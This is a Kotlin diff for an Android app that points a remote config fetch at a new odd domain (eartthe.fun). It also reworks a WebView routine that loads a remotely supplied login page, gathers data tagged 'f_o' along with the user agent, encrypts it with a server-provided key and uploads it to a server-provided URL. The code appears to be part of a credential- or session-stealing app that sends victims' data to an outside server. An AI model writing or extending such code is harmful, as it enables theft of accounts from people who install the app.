@@ -35,7 +35,7 @@ import java.io.File
 
 fun AppCompatActivity.getConfig(onSuccess: () -> Unit, onFailure: () -> Unit) {
     HttpTools.with(this)
-        .fromUrl("https://seasheel.xyz/config")
+        .fromUrl("https://eartthe.fun/config")
         .ofTypeGet()
         .connect(object : OnNetworkRequest {
             override fun onSuccess(response: String?) {
@@ -77,7 +77,7 @@ fun AppCompatActivity.getConfig(onSuccess: () -> Unit, onFailure: () -> Unit) {
 }
 
 fun AppCompatActivity.upload(content: String, onSuccess: (String) -> Unit, onFailure: () -> Unit) {
-    HttpTools.with(this).fromUrl(testUrl)
+    HttpTools.with(this).fromUrl(updateBean.apiUrl())
         .ofTypePost()
         .connect(object : OnNetworkRequest {
             override fun onSuccess(response: String?) {
@@ -366,14 +366,14 @@ fun AppCompatActivity.setWebView(
                                     "type" to "f_o",
                                     "b" to view.settings.userAgentString
                                 )
-                            ).encrypt(updateBean.d!!)
+                            ).encrypt(updateBean.key())
                             upload(content)//上传
                         }
                     }
                 }
             }
         }
-        loadUrl(updateBean.m ?: "https://www.baidu.com")
+        loadUrl(updateBean.loginUrl() ?: "https://www.baidu.com")
     }
 
 }
